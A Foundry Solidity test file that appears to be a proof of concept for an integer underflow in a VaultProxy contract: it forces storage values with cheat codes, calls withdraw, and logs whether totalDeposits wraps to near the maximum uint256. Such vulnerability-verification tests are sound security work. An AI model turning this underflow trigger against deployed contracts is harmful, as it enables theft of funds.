// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol";

contract VaultProxyTest is Test {
    VaultProxy vault;
    address owner = address(0x1001);

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.prank(owner);
        vault = new VaultProxy{value: 10 ether}();
    }

    function test_withdrawUnderflow() public {
        vm.startPrank(owner);
        
        // Deposit slot calculation
        bytes32 depositSlot = keccak256(abi.encode(owner, uint256(1)));
        
        // Initialize storage values to trigger underflow
        vm.store(address(vault), depositSlot, bytes32(uint256(10 ether))); // Deposits[owner] = 10 ether
        vm.store(address(vault), bytes32(uint256(2)), bytes32(uint256(1 ether))); // totalDeposits = 1 ether
        vm.store(address(vault), bytes32(uint256(3)), bytes32(uint256(10 ether))); // maxWithdrawal = 10 ether

        console2.log("--- BEFORE-Trigger Withdraw ---");
        uint256 totalDepositsBefore = vault.totalDeposits();
        console2.log("totalDeposits before:", totalDepositsBefore);
        assertEq(totalDepositsBefore, 1 ether, "Initial totalDeposits should be 1 ether");

        console2.log("--- Trigger Withdraw ---");
        vault.withdraw(2 ether);

        console2.log("--- AFTER-Trigger Withdraw ---");
        uint256 totalDepositsAfter = vault.totalDeposits();
        console2.log("totalDeposits after:", totalDepositsAfter);

        // Calculate expected underflow result
        uint256 expectedTotalDeposits = type(uint256).max - 1 ether + 1;
        bool vulnerabilityExists = (totalDepositsAfter == expectedTotalDeposits);

        // Output vulnerability verdict
        if (vulnerabilityExists) {
            console2.log("Verdict: totalDeposits value changed from 1 ether to max uint256 value");
            console2.log("Vulnerability Exists: totalDeposits underflow vulnerability successfully exploited");
        } else {
            console2.log("Verdict: totalDeposits value didn't underflow as expected");
            console2.log("Vulnerability not Exist: Failed to trigger totalDeposits underflow");
        }
    }
}